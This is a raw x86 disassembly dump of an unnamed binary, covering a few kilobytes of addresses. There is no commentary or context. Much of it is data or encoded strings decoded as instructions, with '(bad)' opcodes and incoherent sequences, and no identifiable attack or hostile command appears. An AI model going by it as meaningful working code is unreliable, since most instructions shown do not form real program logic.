  43331a:	ret    
  43331b:	push   ss
  43331c:	push   0x45
  43331e:	lea    ecx,[ebx+0x4de80cb0]
  433324:	sti    
  433325:	add    edi,edi
  433327:	or     BYTE PTR [ebp+0x4d],al
  43332a:	mov    ebp,DWORD PTR [ebx]
  43332c:	xor    ebp,ecx
  43332e:	mov    al,BYTE PTR [edx]
  433330:	add    eax,0xc7200
  433335:	jne    0x433384
  433337:	lea    esi,[ebx]
  433339:	mov    al,0xf
  43333b:	call   0xf2a00
  433340:	shl    DWORD PTR [ecx],0x84
  433343:	pushf  
  433344:	add    DWORD PTR [ecx+0x4545d000],ecx
  43334a:	mov    esi,DWORD PTR [edx]
  43334c:	xor    ebx,DWORD PTR [edx+ecx*4+0x72c805c7]
  433353:	test   DWORD PTR [eax],eax
  433355:	clc    
  433356:	dec    ebp
  433357:	inc    ebp
  433358:	xor    edi,DWORD PTR [edi+ecx*1]
  43335b:	pushf  
  43335c:	ror    BYTE PTR [ebp+0x4dc1d0cb],0x84
  433363:	lea    eax,[ecx]
  433365:	int3   
  433366:	add    BYTE PTR [ebp+0x45],cl
  433369:	lea    ecx,[ebx-0x75b2cc38]
  43336f:	lea    eax,ds:0x4d72c4
  433375:	mov    ecx,DWORD PTR [ebp-0x4]
  433378:	xor    ecx,edi
  43337a:	bswap  ebx
  43337c:	ror    BYTE PTR [ebp-0x35],0xe9
  433380:	rol    DWORD PTR [ecx],0x84
  433383:	add    BYTE PTR [ecx],al
  433385:	xor    eax,DWORD PTR [eax]
  433387:	pushf  
  433388:	inc    ebp
  433389:	jnp    0x8a43678c
  43338f:	mov    eax,DWORD PTR ds:0xcf72e8
  433395:	lock dec ebp
  433397:	retf   
  433398:	xor    ecx,DWORD PTR [ebp+0xf]
  43339b:	mov    eax,eax
  43339d:	fmul   st,st(3)
  43339f:	test   ecx,0x19b8484
  4333a5:	xor    al,BYTE PTR [eax]
  4333a7:	mov    DWORD PTR [ebp-0x28],eax
  4333aa:	mov    eax,DWORD PTR [ebp+0x33]
  4333ad:	mov    ecx,DWORD PTR [edx+0x72c705d8]
  4333b3:	ret    
  4333b4:	add    al,cl
  4333b6:	dec    ebp
  4333b7:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  4333bd:	add    ecx,DWORD PTR ds:0xc7250
  4333c3:	inc    ebp
  4333c4:	rcl    DWORD PTR [eax+0x4d],0x2b
  4333c8:	mov    edi,edi
  4333ca:	xor    ecx,DWORD PTR [ebx+0xde48a]
  4333d0:	jb     0x433399
  4333d2:	add    BYTE PTR [ecx+eax*8-0x74cdb2b5],al
  4333d9:	mov    esi,DWORD PTR [ebx]
  4333db:	cld    
  4333dc:	mov    cl,bh
  4333de:	or     eax,0x372b6
  4333e3:	cmp    ecx,eax
  4333e5:	jne    0x433462
  4333eb:	mov    eax,DWORD PTR [ebp-0x20]
  4333ee:	mov    eax,DWORD PTR [eax]
  4333f0:	xor    eax,edi
  4333f2:	mov    al,BYTE PTR [ebp+eax*1+0x32724b]
  4333f9:	mov    ecx,DWORD PTR [ebp-0x4]
  4333fc:	mov    ecx,edi
  4333fe:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  433404:	jb     0x433415
  433406:	add    BYTE PTR [edi-0x3f],dl
  433409:	add    BYTE PTR [ebp-0x75],cl
  43340c:	mov    esi,eax
  43340e:	xor    eax,DWORD PTR [eax]
  433410:	mov    al,bh
  433412:	or     eax,0x4b7284
  433417:	xor    al,cl
  433419:	mov    ecx,DWORD PTR [ebp-0x4]
  43341c:	mov    ecx,edi
  43341e:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  433424:	jb     0x433435
  433426:	add    BYTE PTR [edi],dh
  433428:	enter  0x8500,0x8b
  43342c:	add    ah,bl
  43342e:	add    BYTE PTR [eax],al
  433430:	inc    ebp
  433431:	(bad)  
  433432:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a4b]
  433439:	mov    esi,DWORD PTR [edx-0x4]
  43343c:	add    bh,cl
  43343e:	dec    ebp
  43343f:	mov    dh,0x8b
  433441:	add    esi,DWORD PTR [ebx]
  433443:	cmp    ecx,DWORD PTR [edx+0x72170d0f]
  433449:	add    BYTE PTR [eax],al
  43344b:	mov    eax,ecx
  43344d:	loopne 0x43349c
  43344f:	add    BYTE PTR [ebx-0x757bcc39],cl
  433455:	dec    ebx
  433456:	or     eax,0x8b7232
  43345b:	in     al,0xc1
  43345d:	or     DWORD PTR [ebp-0x31],ecx
  433460:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4b]
  433467:	xor    dh,BYTE PTR [edx-0x75]
  43346a:	add    al,dh
  43346c:	enter  0x4f09,0xcf
  433470:	inc    ebp
  433471:	mov    WORD PTR [ebx-0x75cdccb5],cs
  433477:	or     al,BYTE PTR ds:0xe4728b
  43347d:	or     DWORD PTR [ebp-0x31],ecx
  433480:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4f]
  433487:	cmp    dh,BYTE PTR [edx+0xf]
  43348a:	add    bl,dl
  43348c:	rol    DWORD PTR [eax],0x4d
  43348f:	mov    ecx,DWORD PTR [ebx-0x75ffcc10]
  433495:	(bad)  
  433496:	or     eax,0x4b7284
  43349b:	xor    al,cl
  43349d:	mov    ecx,DWORD PTR [ebp-0x20]
  4334a0:	mov    ecx,DWORD PTR [ecx]
  4334a2:	xor    ecx,edi
  4334a4:	mov    cl,BYTE PTR [ebp+ecx*1+0x32724b]
  4334ab:	xor    cl,al
  4334ad:	mov    ecx,DWORD PTR [edi]
  4334af:	fadd   QWORD PTR [ebp+0x9]
  4334b2:	call   0xffd02f86
  4334b7:	dec    ebx
  4334b8:	dec    ebp
  4334b9:	xor    bh,BYTE PTR [ebx]
  4334bb:	or     dh,BYTE PTR [ebx+ecx*4-0x75]
  4334bf:	loopne 0x4334bd
  4334c1:	or     edi,eax
  4334c3:	iret   
  4334c4:	ret    
  4334c5:	mov    WORD PTR [ebp+0x4f],es
  4334c8:	mov    esi,DWORD PTR [edx]
  4334ca:	call   0x8452fc09
  4334cf:	(bad)  
  4334d0:	fwait
  4334d1:	add    BYTE PTR [edx],dh
  4334d3:	mov    esi,DWORD PTR [ebx]
  4334d5:	fmul   QWORD PTR [ebx+0x55c7fc00]
  4334db:	test   BYTE PTR [ebx],dh
  4334dd:	dec    ebx
  4334de:	add    esi,DWORD PTR [edx]
  4334e0:	cmp    ecx,DWORD PTR [ebx+0x9f8f00f]
  4334e6:	dec    edi
  4334e8:	mov    ecx,DWORD PTR [esp+edi*8+0x33324d4b]
  4334ef:	xor    al,BYTE PTR [ebx]
  4334f1:	mov    edi,DWORD PTR [ebx]
  4334f3:	in     al,0x75
  4334f5:	or     DWORD PTR [ebx+0x4d8ce8cf],ecx
  4334fb:	dec    ebx
  4334fc:	xor    esi,DWORD PTR [edx]
  4334fe:	lea    ecx,[edx]
  433500:	or     BYTE PTR [ebx+0x900f072],cl
  433506:	ja     0x4334d7
  433508:	sbb    BYTE PTR [ebp+esi*2-0x67cd72b1],cl
  43350f:	cmp    ch,al
  433511:	jne    0x433506
  433513:	mov    edi,edi
  433515:	fadd   QWORD PTR [ebp+0x0]
  433518:	mov    eax,edi
  43351a:	fadd   DWORD PTR [edi+eax*8-0x3ecd3cb5]
  433521:	mov    edx,DWORD PTR [ebx]
  433523:	in     al,0x45
  433525:	or     DWORD PTR [ebx],esi
  433527:	iret   
  433528:	add    ecx,DWORD PTR [eax+edx*2+0x4532184b]
  43352f:	xor    dl,BYTE PTR [eax-0x75]
  433532:	sbb    al,0xe0
  433534:	dec    DWORD PTR [ecx]
  433536:	mov    ecx,edi
  433538:	in     al,dx
  433539:	mov    eax,es
  43353b:	dec    ebx
  43353c:	mov    DWORD PTR [edx],esi
  43353e:	fmul   QWORD PTR [edx]
  433540:	jne    0x4334cd
  433542:	(bad)  
  433543:	(bad)  
  433545:	or     DWORD PTR [ebp-0x31],eax
  433548:	add    ecx,DWORD PTR [eax+ecx*1-0xccd17b1]
  43354f:	cmp    bh,bh
  433551:	jne    0x433598
  433553:	lea    ecx,[ebx-0x38372750]
  433559:	inc    ebx
  43355b:	mov    eax,ecx
  43355d:	mov    eax,0xa00c111
  433562:	jne    0x4335a9
  433564:	mov    esi,DWORD PTR [ebx]
  433566:	test   al,0x3
  433568:	inc    ebp
  433569:	mov    DWORD PTR [eax-0xc],edx
  43356c:	loop   0x4335b3
  43356e:	push   DWORD PTR [ebx]
  433570:	mov    ecx,DWORD PTR [ebp+0x724d3010]
  433576:	add    DWORD PTR [eax],eax
  433578:	mov    eax,edi
  43357a:	lods   al,BYTE PTR ds:[esi]
  43357b:	dec    ebp
  43357c:	inc    ebp
  43357d:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  433583:	retf   
  433584:	mov    edx,ecx
  433586:	adc    al,0x84
  433588:	(bad)  
  433589:	std    
  43358a:	ret    
  43358b:	jmp    FWORD PTR [edi-0x2b7474bb]
  433591:	hlt    
  433592:	rol    edi,0x82
  433595:	ret    
  433596:	cld    
  433597:	enter  0x11ff,0x45
  43359b:	inc    ebp
  43359c:	pop    edi
  43359d:	mov    ebx,DWORD PTR [ebx+0x14]
  4335a0:	ret    0xc7
  4335a3:	test   BYTE PTR [ebx+0x4532519b],cl
  4335a9:	jmp    0x433536
  4335ab:	push   0x8
  4335ad:	call   DWORD PTR [esi]
  4335af:	in     al,dx
  4335b0:	add    BYTE PTR [ebp+0x1],0x50
  4335b4:	add    bh,ah
  4335b6:	add    bh,bh
  4335b8:	icebp  
  4335b9:	mov    ecx,DWORD PTR [eax]
  4335bb:	cld    
  4335bc:	pop    es
  4335bd:	dec    ebp
  4335be:	shl    DWORD PTR [ebx],0x72
  4335c1:	add    eax,DWORD PTR [eax]
  4335c3:	cmp    edx,ecx
  4335c5:	je     0x4335d7
  4335c7:	mov    esi,DWORD PTR [ebp-0x4]
  4335ca:	inc    edi
  4335cc:	or     al,0xc3
  4335ce:	jmp    FWORD PTR [edx-0x18]
  4335d1:	(bad)  
  4335d2:	sti    
  4335d3:	cwde   
  4335d4:	(bad)  
  4335d5:	call   0xffa12ee0
  4335da:	or     al,0x45
  4335dc:	push   ebp
  4335dd:	sub    esp,0x18
  4335e0:	push   ebx
  4335e1:	inc    ebp
  4335e2:	mov    edi,edi
  4335e4:	mov    ebp,DWORD PTR [eax+ecx*1+0x578b4d75]
  4335eb:	test   al,0x54
  4335ed:	inc    ebp
  4335ee:	push   ecx
  4335ef:	push   eax
  4335f0:	xor    ebp,DWORD PTR [ebx-0x748d0041]
  4335f6:	add    ah,bh
  4335f8:	(bad)  
  4335f9:	dec    ebp
  4335fa:	add    DWORD PTR [ebx],esi
  4335fc:	inc    ebp
  4335fd:	add    ecx,DWORD PTR [ebx+0x74943b]
  433603:	push   0xffffff8b
  433605:	dec    DWORD PTR [ebx-0x7fbaeb54]
  43360b:	add    eax,DWORD PTR [ecx]
  43360d:	or     BYTE PTR [eax],al
  43360f:	call   0xff852e14
  433614:	mov    eax,DWORD PTR [ebp+0x14]
  433617:	mov    ecx,DWORD PTR [ecx+0x801ac]
  43361d:	inc    ebp
  43361e:	dec    ecx
  43361f:	add    ebp,DWORD PTR [edx+0x14]
  433622:	push   0x8b3045
  433627:	call   0x33ad839c
  43362c:	inc    DWORD PTR [ebx]
  43362e:	mov    DWORD PTR [edi],ecx
  433630:	mov    eax,ecx
  433632:	or     BYTE PTR [ebp-0x3d],cl
  433635:	cmp    eax,edi
  433637:	cmovne esp,DWORD PTR [ebx+ecx*4-0x1]
  43363c:	adc    BYTE PTR [ebx+0x5eff0845],cl
  433642:	adc    al,0xc9
  433644:	inc    ebp
  433645:	adc    BYTE PTR [eax+0x55],dl
  433648:	jne    0x433636
  43364a:	call   0xff5435da
  43364f:	dec    ebp
  433650:	inc    ebp
  433651:	mov    ecx,DWORD PTR [ebx+0x390338b]
  433657:	add    BYTE PTR [ebx],bh
  433659:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  43365d:	push   esp
  43365e:	or     al,0x51
  433660:	dec    ebp
  433661:	xor    DWORD PTR [ebx],0xf32039b
  433667:	cmp    eax,DWORD PTR [ebp+0x74]
  43366a:	mov    edi,edi
  43366c:	pop    edi
  43366d:	adc    BYTE PTR [ebx+0x75],bl
  433670:	ret    0x50
  433673:	mov    edx,DWORD PTR ss:[edi-0x7d]
  433677:	(bad)  
  433678:	clc    
  433679:	mov    esp,ebp
  43367b:	pop    ecx
  43367c:	mov    ecx,0xf80085c2
  433681:	mov    ecx,DWORD PTR [ecx+edx*2]
  433684:	push   esi
  433685:	push   esi
  433686:	(bad)  
  433687:	lock add DWORD PTR [ebp+0x44],eax
  43368b:	mov    edx,DWORD PTR [eax]
  43368d:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  433691:	or     BYTE PTR [edi+eax*1+0x51],dl
  433695:	ret    
  433696:	xor    ebx,DWORD PTR [ebx+0x37232be]
  43369c:	add    BYTE PTR [ecx+0x147c8bfe],cl
  4336a2:	or     al,0x80
  4336a4:	jge    0x4336a7
  4336a6:	mov    DWORD PTR [eax],eax
  4336a8:	and    al,0x8
  4336aa:	cmp    DWORD PTR [ebp+0x10],eax
  4336ad:	mov    edx,DWORD PTR [esi]
  4336af:	xchg   esp,eax
  4336b0:	dec    esp
  4336b1:	add    BYTE PTR [eax],dl
  4336b3:	mov    ecx,edx
  4336b5:	add    edx,DWORD PTR [esp+edi*1+0x8]
  4336b9:	dec    ebp
  4336ba:	into   
  4336bb:	mov    ebp,DWORD PTR [edi+0x240089d8]
  4336c1:	mov    edx,DWORD PTR [eax+0x14]
  4336c4:	das    
  4336c5:	add    al,0x45
  4336c7:	add    BYTE PTR [ebp+0x0],dh
  4336ca:	mov    edi,edi
  4336cc:	and    al,0x50
  4336ce:	mov    eax,DWORD PTR [eax]
  4336d0:	and    al,0xd1
  4336d2:	xor    eax,DWORD PTR [esi]
  4336d4:	lea    eax,[ebp+0x8]
  4336d7:	xor    esi,DWORD PTR [edx+0x3]
  4336da:	add    BYTE PTR [ecx+0x4510fc44],cl
  4336e0:	xor    ecx,DWORD PTR [ebx+0x75eb0c9c]
  4336e6:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  4336f0:	cmp    al,0xff
  4336f2:	pushf  
  4336f3:	mov    edi,edi
  4336f5:	or     BYTE PTR [esi+ecx*1],cl
  4336f8:	jne    0x4336bd
  4336fa:	call   0xc36c6
  4336ff:	adc    BYTE PTR [ebp+eax*2+0xc],al
  433703:	mov    ebx,DWORD PTR [eax]
  433705:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  433709:	mov    DWORD PTR [edi+ebp*4+0x10],0xff0175fc
  433711:	pop    esi
  433712:	and    al,0xc9
  433714:	and    al,0x10
  433716:	call   DWORD PTR [ebp-0x73]
  433719:	in     al,dx
  43371a:	jmp    esp
  43371c:	je     0x4336a1
  43371e:	call   DWORD PTR [eax]
  433720:	and    al,0x31
  433722:	call   0xffcd35c3
  433727:	and    al,0x44
  433729:	push   edi
  43372a:	or     al,0x41
  43372c:	pop    esi
  43372d:	mov    ebp,esp
  43372f:	and    al,0xc2
  433731:	mov    eax,DWORD PTR [eax]
  433733:	and    al,0x85
  433735:	mov    edx,0x733080e
  43373a:	jne    0x433736
  43373c:	test   DWORD PTR [ebx+0x3083275],ebx
  433742:	dec    DWORD PTR [ecx-0x74dbdb15]
  433748:	sbb    BYTE PTR [esp+edx*1],cl
  43374b:	jl     0x43374c
  43374d:	adc    al,0x24
  43374f:	dec    ebp
  433750:	mov    esi,DWORD PTR [ebp+0xc]
  433753:	mov    ecx,DWORD PTR [eax]
  433755:	and    al,0x39
  433757:	xor    ebx,DWORD PTR [ebx+ecx*4]
  43375a:	or     BYTE PTR [eax+edx*1],ah
  43375d:	add    eax,DWORD PTR [edi+ecx*1+0x4c24ca32]
  433764:	clc    
  433765:	jmp    0x433703
  433767:	adc    al,bh
  433769:	inc    esp
  43376a:	je     0x4337b8
  43376c:	and    al,0xc2
  43376e:	je     0x43370b
  433770:	mov    ecx,DWORD PTR [ecx+0x687d685d]
  433776:	dec    DWORD PTR [ecx+0x235fbf08]
  43377c:	sbb    al,0x10
  43377e:	add    BYTE PTR [esi+edi*1+0x10],cl
  433782:	add    BYTE PTR [ebx+0xb],dh
  433785:	adc    BYTE PTR [eax],al
  433787:	mov    WORD PTR ds:0x3d450010,?
  43378d:	adc    BYTE PTR [eax],al
  43378f:	add    DWORD PTR [eax+edx*1],esp
  433792:	add    BYTE PTR [edx+0x6],cl
  433795:	adc    BYTE PTR [eax],al
  433797:	sub    dx,WORD PTR [eax]
  43379a:	add    bh,dl
  43379c:	imul   edx,DWORD PTR [eax],0x10302300
  4337a2:	add    BYTE PTR [esi+0x7b001077],dl
  4337a8:	aaa    
  4337a9:	inc    ebx
  4337aa:	add    BYTE PTR [edi+0x37],bh
  4337ad:	inc    ebx
  4337ae:	add    BYTE PTR [ebx-0x78ffbcc9],al
  4337b4:	aaa    
  4337b5:	inc    ebx
  4337b6:	add    BYTE PTR [ebx-0x70ffbcc9],cl
  4337bc:	aaa    
  4337bd:	inc    ebx
  4337be:	add    BYTE PTR [ebx-0x68ffbcc9],dl
  4337c4:	aaa    
  4337c5:	inc    ebx
  4337c6:	add    BYTE PTR [ebx-0x60ffbcc9],bl
  4337cc:	aaa    
  4337cd:	inc    ebx
  4337ce:	add    BYTE PTR [ebx-0x5fffbcc9],ah
  4337d4:	adc    DWORD PTR [eax],edx
  4337d6:	add    BYTE PTR [ecx],cl
  4337d8:	jo     0x4337ea
  4337da:	add    BYTE PTR ds:0xd7001027,ch
  4337e0:	pop    eax
  4337e1:	adc    BYTE PTR [eax],al
  4337e3:	push   es
  4337e4:	adc    al,0x10
  4337e6:	add    BYTE PTR [esi+0x33001031],ah
  4337ec:	ins    BYTE PTR es:[edi],dx
  4337ed:	adc    BYTE PTR [eax],al
  4337ef:	jb     0x433830
  4337f1:	adc    BYTE PTR [eax],al
  4337f3:	shl    DWORD PTR [edi],cl
  4337f5:	inc    ebx
  4337f6:	add    bh,dl
  4337f8:	aaa    
  4337f9:	inc    ebx
  4337fa:	add    bl,bl
  4337fc:	aaa    
  4337fd:	inc    ebx
  4337fe:	add    bh,bl
  433800:	aaa    
  433801:	inc    ebx
  433802:	add    bl,ah
  433804:	aaa    
  433805:	inc    ebx
  433806:	add    bh,ah
  433808:	aaa    
  433809:	inc    ebx
  43380a:	add    bl,ch
  43380c:	aaa    
  43380d:	inc    ebx
  43380e:	add    bh,ch
  433810:	aaa    
  433811:	inc    ebx
  433812:	add    dh,cl
  433814:	jge    0x433826
  433816:	add    BYTE PTR [esi-0x3dffef8e],dl
  43381c:	or     dl,BYTE PTR [eax]
  43381e:	add    dh,bl
  433820:	sub    dl,BYTE PTR [eax]
  433822:	add    BYTE PTR [edx],bl
  433824:	ins    BYTE PTR es:[edi],dx
  433825:	adc    BYTE PTR [eax],al
  433827:	addr16 jno 0x43383a
  43382a:	add    BYTE PTR [ebp+0x3d],ch
  43382d:	adc    BYTE PTR [eax],al
  43382f:	lds    esp,FWORD PTR [eax+0x10]
  433832:	add    BYTE PTR [ebx],dl
  433834:	cmp    BYTE PTR [ebx+0x0],al
  433837:	pop    ss
  433838:	cmp    BYTE PTR [ebx+0x0],al
  43383b:	sbb    edi,DWORD PTR [eax]
  43383d:	inc    ebx
  43383e:	add    BYTE PTR [edi],bl
  433840:	cmp    BYTE PTR [ebx+0x0],al
  433843:	and    edi,DWORD PTR [eax]
  433845:	inc    ebx
  433846:	add    BYTE PTR [edi],ah
  433848:	cmp    BYTE PTR [ebx+0x0],al
  43384b:	sub    edi,DWORD PTR [eax]
  43384d:	inc    ebx
  43384e:	add    BYTE PTR [edi],ch
  433850:	cmp    BYTE PTR [ebx+0x0],al
  433853:	cmp    al,0x14
  433855:	adc    BYTE PTR [eax],al
  433857:	clc    
  433858:	cmp    dl,BYTE PTR [eax]
  43385a:	add    BYTE PTR [ecx],ah
  43385c:	pop    ds
  43385d:	adc    BYTE PTR [eax],al
  43385f:	mov    edi,0x6001073
  433864:	adc    al,0x10
  433866:	add    BYTE PTR [ecx+0x34],bh
  433869:	adc    BYTE PTR [eax],al
  43386b:	cmp    edi,DWORD PTR [eax+edx*1+0x0]
  43386f:	shl    DWORD PTR [edx+0x10],1
  433872:	add    BYTE PTR [ebx+0x38],dl
  433875:	inc    ebx
  433876:	add    BYTE PTR [edi+0x38],dl
  433879:	inc    ebx
  43387a:	add    BYTE PTR [ebx+0x38],bl
  43387d:	inc    ebx
  43387e:	add    BYTE PTR [edi+0x38],bl
  433881:	inc    ebx
  433882:	add    BYTE PTR [ebx+0x38],ah
  433885:	inc    ebx
  433886:	add    BYTE PTR [edi+0x38],ah
  433889:	inc    ebx
  43388a:	add    BYTE PTR [ebx+0x38],ch
  43388d:	inc    ebx
  43388e:	add    BYTE PTR [edi+0x38],ch
  433891:	inc    ebx
  433892:	add    BYTE PTR [ebp+0x14],al
  433895:	adc    BYTE PTR [eax],al
  433897:	fwait
  433898:	pop    ds
  433899:	adc    BYTE PTR [eax],al
  43389b:	jnp    0x4338c0
  43389d:	adc    BYTE PTR [eax],al
  43389f:	pop    esi
  4338a0:	adc    BYTE PTR cs:[eax],al
  4338a3:	popf   
  4338a4:	jno    0x4338b6
  4338a6:	add    ah,bl
  4338a8:	inc    ebp
  4338a9:	adc    BYTE PTR [eax],al
  4338ab:	sbb    edx,DWORD PTR [edx+0x10]
  4338ae:	add    BYTE PTR [edx-0x6cffefd7],bl
  4338b4:	cmp    BYTE PTR [ebx+0x0],al
  4338b7:	xchg   edi,eax
  4338b8:	cmp    BYTE PTR [ebx+0x0],al
  4338bb:	fwait
  4338bc:	cmp    BYTE PTR [ebx+0x0],al
  4338bf:	lahf   
  4338c0:	cmp    BYTE PTR [ebx+0x0],al
  4338c3:	mov    ds:0xa7004338,eax
  4338c8:	cmp    BYTE PTR [ebx+0x0],al
  4338cb:	stos   DWORD PTR es:[edi],eax
  4338cc:	cmp    BYTE PTR [ebx+0x0],al
  4338cf:	scas   eax,DWORD PTR es:[edi]
  4338d0:	cmp    BYTE PTR [ebx+0x0],al
  4338d3:	push   esp
  4338d4:	xor    al,0x4b
  4338d6:	aaa    
  4338d7:	pop    edi
  4338d8:	inc    edx
  4338d9:	dec    ebx
  4338da:	xor    DWORD PTR [ecx],edi
  4338dc:	push   edi
  4338dd:	add    BYTE PTR [ecx+0x39],cl
  4338e0:	xor    al,0x5f
  4338e2:	pop    ecx
  4338e3:	inc    edi
  4338e4:	push   edx
  4338e5:	pop    edi
  4338e6:	dec    edx
  4338e7:	xor    al,BYTE PTR [edx+0x30]
  4338ea:	push   ebx
  4338eb:	add    BYTE PTR [ecx+0x4a],cl
  4338ee:	cmp    BYTE PTR [edi+0x38],bl
  4338f1:	xor    al,0x43
  4338f3:	xor    bl,BYTE PTR [eax+0x36]
  4338f6:	pop    edi
  4338f7:	inc    ebx
  4338f8:	add    BYTE PTR [edx+0x33],cl
  4338fb:	dec    ebp
  4338fc:	cmp    BYTE PTR [edi+0x53],bl
  4338ff:	xor    DWORD PTR [eax],edi
  433901:	pop    edx
  433902:	pop    edi
  433903:	xor    BYTE PTR [edx+0x52],cl
  433906:	inc    ecx
  433907:	add    BYTE PTR [edx+0x42],al
  43390a:	inc    ebp
  43390b:	pop    edi
  43390c:	cmp    DWORD PTR [eax],edi
  43390e:	push   ebp
  43390f:	inc    edx
  433910:	xor    eax,0x5244505f
  433915:	xor    BYTE PTR [eax],al
  433917:	inc    edx
  433918:	inc    esp
  433919:	inc    edx
  43391a:	cmp    DWORD PTR [edi+0x52],ebx
  43391d:	dec    esp
  43391e:	inc    ebp
  43391f:	add    BYTE PTR [ebx+0x37],dl
  433922:	push   esp
  433923:	xor    BYTE PTR [edi+0x55],bl
  433926:	push   ebx
  433927:	aaa    
  433928:	dec    ebp
  433929:	pop    edi
  43392a:	xor    ecx,DWORD PTR [edx+0x4e]
  43392d:	dec    ebx
  43392e:	add    BYTE PTR [edx+0x47],cl
  433931:	inc    edi
  433932:	xor    eax,0x534e5f32
  433937:	push   esp
  433938:	pop    edi
  433939:	push   esp
  43393a:	inc    edx
  43393b:	add    BYTE PTR [ebx+0x4d],al
  43393e:	xor    BYTE PTR [edi+0x47],bl
  433941:	cmp    DWORD PTR [ecx+0x5f],ebx
  433944:	push   eax
  433945:	push   ecx
  433946:	push   ecx
  433947:	pop    edi
  433948:	inc    ebx
  433949:	push   edi
  43394a:	push   esi
  43394b:	add    BYTE PTR [ecx+0x57],cl
  43394e:	inc    ebp
  43394f:	pop    edi
  433950:	pop    ecx
  433951:	push   edx
  433952:	inc    edx
  433953:	pop    edi
  433954:	inc    edi
  433955:	add    BYTE PTR [ebx+0x51],dl
  433958:	cmp    DWORD PTR ds:0x4d305f33,esi
  43395e:	inc    edi
  43395f:	xor    edx,DWORD PTR [edx+0x34]
  433962:	pop    edi
  433963:	pop    edx
  433964:	cmp    BYTE PTR [eax],al
  433966:	inc    edi
  433967:	xor    esi,DWORD PTR ds:0x5451585f
  43396d:	dec    esp
  43396e:	add    BYTE PTR [edi+esi*1+0x34],cl
  433972:	pop    edi
  433973:	cmp    BYTE PTR [edi+0x49],dl
  433976:	xor    eax,0x5700505f
  43397b:	cmp    DWORD PTR [edi+ebx*2+0x50],eax
  43397f:	dec    esi
  433980:	dec    edx
  433981:	cmp    BYTE PTR [eax],al
  433983:	pop    edx
  433984:	dec    ebx
  433985:	xor    eax,0x4f5f3131
  43398a:	xor    dh,BYTE PTR [ecx]
  43398c:	pop    edi
  43398d:	inc    ebp
  43398e:	push   esp
  43398f:	inc    esp
  433990:	inc    ebp
  433991:	add    BYTE PTR [edi+0x55],dl
  433994:	cmp    DWORD PTR [edi+0x5a],ebx
  433997:	push   edx
  433998:	inc    edi
  433999:	xor    DWORD PTR [ebp+0x0],ecx
  43399c:	pop    edx
  43399d:	dec    ecx
  43399e:	dec    ebp
  43399f:	ss pop edi
  4339a1:	pop    edx
  4339a2:	push   edx
  4339a3:	cmp    BYTE PTR [esi+0x30],dl
  4339a6:	pop    edi
  4339a7:	push   ecx
  4339a8:	dec    esi
  4339a9:	add    BYTE PTR [ebx+0x32],dl
  4339ac:	inc    ebx
  4339ad:	cmp    BYTE PTR [edi+0x52],bl
  4339b0:	dec    ecx
  4339b1:	xor    BYTE PTR [eax],al
  4339b3:	inc    edi
  4339b4:	xor    eax,0x314f5f4b
  4339b9:	xor    DWORD PTR [edi+0x38],ebx
  4339bc:	push   ebp
  4339bd:	add    BYTE PTR [edi+0x4b],al
  4339c0:	xor    bl,BYTE PTR [edi+0x43]
  4339c3:	push   ebp
  4339c4:	cmp    DWORD PTR [ebp+0x4b],ecx
  4339c7:	ss pop edi
  4339c9:	pop    edx
  4339ca:	push   edi
  4339cb:	inc    esp
  4339cc:	xor    BYTE PTR [eax],al
  4339ce:	dec    ecx
  4339cf:	inc    edi
  4339d0:	xor    eax,0x3058555f
  4339d5:	dec    ebx
  4339d6:	pop    edi
  4339d7:	push   edi
  4339d8:	add    BYTE PTR [eax+0x0],bl
  4339db:	inc    edi
  4339dc:	add    BYTE PTR [edx+0x0],al
  4339df:	pop    edi
  4339e0:	add    BYTE PTR [ebx],dh
  4339e2:	add    BYTE PTR [eax],bh
  4339e4:	add    BYTE PTR [ebx+0x0],cl
  4339e7:	xor    eax,0x33003500
  4339ec:	add    BYTE PTR [eax],dh
  4339ee:	add    BYTE PTR [edi+0x0],bl
  4339f1:	push   esp
  4339f2:	add    BYTE PTR [ebp+0x0],cl
  4339f5:	xor    BYTE PTR [eax],al
  4339f7:	add    BYTE PTR [eax],al
  4339f9:	inc    esi
  4339fa:	add    BYTE PTR [eax+0x0],bl
  4339fd:	xor    BYTE PTR [eax],al
  4339ff:	pop    edi
  433a00:	add    BYTE PTR [ecx],dh
  433a02:	add    BYTE PTR [ebx+0x0],al
  433a05:	xor    eax,0x5f003100
  433a0a:	add    BYTE PTR [ecx+0x0],al
  433a0d:	xor    eax,DWORD PTR [eax]
  433a0f:	add    BYTE PTR [eax],al
  433a11:	push   ebx
  433a12:	add    BYTE PTR [ebx+0x0],dl
  433a15:	dec    eax
  433a16:	add    BYTE PTR [edi+0x0],bl
  433a19:	push   esp
  433a1a:	add    BYTE PTR [ebx+0x0],al
  433a1d:	push   ebx
  433a1e:	add    BYTE PTR [edx+0x0],dl
  433a21:	pop    edi
  433a22:	add    BYTE PTR [ecx+0x0],dl
  433a25:	dec    edi
  433a26:	add    BYTE PTR [edi+0x0],al
  433a29:	push   ecx
  433a2a:	add    BYTE PTR [edi+0x0],bl
  433a2d:	pop    ecx
  433a2e:	add    BYTE PTR [eax],al
  433a30:	add    BYTE PTR [edi+0x0],cl
  433a33:	dec    edi
  433a34:	add    BYTE PTR [ebp+0x0],dl
  433a37:	cmp    DWORD PTR [eax],eax
  433a39:	pop    edi
  433a3a:	add    BYTE PTR [edx],dh
  433a3c:	add    BYTE PTR [eax+eax*1+0x32],al
  433a40:	add    BYTE PTR ds:0x47005f00,dh
  433a46:	add    BYTE PTR ds:0x48000000,dh
  433a4c:	add    BYTE PTR [edx+0x0],cl
  433a4f:	push   eax
  433a50:	add    BYTE PTR [edi+0x0],bl
  433a53:	cmp    BYTE PTR [eax],al
  433a55:	add    BYTE PTR ss:0x55004100,dh
  433a5c:	add    BYTE PTR [edi+0x0],bl
  433a5f:	push   edx
  433a60:	add    BYTE PTR [edi],dh
  433a62:	add    BYTE PTR [ecx+0x0],cl
  433a65:	add    BYTE PTR [eax],al
  433a67:	inc    esp
  433a68:	add    BYTE PTR [ecx+0x0],dl
  433a6b:	inc    edx
  433a6c:	add    BYTE PTR [edi+0x0],bl
  433a6f:	push   ecx
